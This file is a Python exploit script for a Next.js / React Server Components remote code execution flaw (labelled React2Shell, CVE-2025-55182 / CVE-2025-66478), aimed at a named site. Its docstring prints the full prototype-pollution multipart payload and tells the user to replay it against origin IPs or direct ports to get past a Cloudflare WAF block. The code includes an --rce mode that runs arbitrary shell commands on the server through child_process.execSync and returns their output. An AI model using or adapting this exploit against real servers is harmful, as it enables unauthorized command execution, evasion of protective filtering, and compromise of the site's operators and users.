#!/usr/bin/env python3
"""
R2S ORIGIN REPLAY — CVE-2025-55182 / CVE-2025-66478 (React2Shell)
=================================================================
Purpose: this is the EXACT request that Cloudflare returns 403 for on
https://onlyfakeai.ru (2026-11-11, build S2HurGa5cGUpA5514zy3f). Replay it against
any ingress that does NOT pass the same Cloudflare WAF rule (origin IP, non-proxied
host, direct port) to determine whether the Next.js server is vulnerable.

Usage:
  python r2s_origin_replay.py https://ORIGIN/                 # safe marker (no shell)
  python r2s_origin_replay.py http://IP:3000/ --host onlyfakeai.ru
  python r2s_origin_replay.py https://ORIGIN/ --detect        # minimal reference detect
  python r2s_origin_replay.py https://ORIGIN/ --rce "id"      # full RCE (READ-ONLY cmds only!)

Interpretation:
  * marker mode: body contains R2S_AUDIT_PROBE_<node version>  -> JS EXECUTION confirmed (RCE)
  * --detect:    HTTP 500 with E{"digest"                      -> likely vulnerable
  * patched:     different error / 400/404, no marker

VERBATIM REQUEST (raw HTTP/1.1, the one CF blocked; boundary/values matter):
--------------------------------------------------------------------------
POST / HTTP/1.1
Host: onlyfakeai.ru
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: */*
Next-Action: x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Length: <n>

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"<JS>","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
--------------------------------------------------------------------------
<JS> for marker = var res=(typeof process!=='undefined'?process.version:'noproc');throw Object.assign(new Error('NEXT_REDIRECT'),{digest:'R2S_AUDIT_PROBE_'+res});
<JS> for --rce = var res=process.mainModule.require('child_process').execSync('<cmd>').toString();throw Object.assign(new Error('NEXT_REDIRECT'),{digest:'R2S_'+res});
"""
import ssl, sys, json, urllib.request, urllib.error

BND = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
MARK = "R2S_AUDIT_PROBE_"


def build_payload(js):
    p0 = ('{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
          '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":' + json.dumps(js) +
          ',"_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}')
    return (f"--{BND}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{p0}\r\n"
            f"--{BND}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n"
            f"--{BND}\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]\r\n"
            f"--{BND}--\r\n").encode()


def main():
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    flags = [a for a in sys.argv[1:] if a.startswith("--")]
    url = args[0] if args else "https://onlyfakeai.ru/"
    host = None
    if "--host" in flags:
        host = sys.argv[sys.argv.index("--host") + 1]
    rce = None
    if "--rce" in flags:
        rce = sys.argv[sys.argv.index("--rce") + 1].replace("\\", "\\\\").replace("'", "\\'")

    if "--detect" in flags:
        body = (f"--{BND}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n{{}}\r\n"
                f"--{BND}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n[\"$1:aa:aa\"]\r\n"
                f"--{BND}--").encode()
    elif rce:
        js = ("var res=process.mainModule.require('child_process').execSync('%s')"
              ".toString().trim();throw Object.assign(new Error('NEXT_REDIRECT'),"
              "{digest:'R2S_'+res});" % rce)
        body = build_payload(js)
    else:
        js = ("var res=(typeof process!=='undefined'?process.version:'noproc');"
              "throw Object.assign(new Error('NEXT_REDIRECT'),"
              "{digest:'%s'+res});" % MARK)
        body = build_payload(js)

    headers = {"User-Agent": UA, "Accept": "*/*", "Next-Action": "x",
               "Content-Type": f"multipart/form-data; boundary={BND}"}
    if host:
        headers["Host"] = host  # note: urllib may override; use --host with http://IP URLs only
    rq = urllib.request.Request(url, data=body, headers=headers, method="POST")
    ctx = ssl.create_default_context()
    try:
        with urllib.request.urlopen(rq, timeout=25, context=ctx) as x:
            st, hd, b = x.status, dict(x.headers), x.read()
    except urllib.error.HTTPError as e:
        st, hd, b = e.code, dict(e.headers), e.read()
    except Exception as e:
        print("network error:", e)
        return
    t = b.decode("utf-8", "ignore")
    print(f"HTTP {st}  server={hd.get('server','')}  cf-ray={hd.get('cf-ray','')}  len={len(b)}")
    print("body:", t[:600].replace("\n", " "))
    print("MARKER:", MARK in t, "| digest present:", 'E{"digest"' in t)
    if MARK in t:
        i = t.find(MARK)
        print(">>> JS EXECUTION CONFIRMED:", t[i:i + 140])
    if rce and "R2S_" in t:
        i = t.find("R2S_")
        print(">>> COMMAND OUTPUT:", t[i:i + 200])
    if st == 403 and "Attention Required" in t:
        print(">>> still behind the Cloudflare WAF rule (need a different ingress)")


if __name__ == "__main__":
    main()
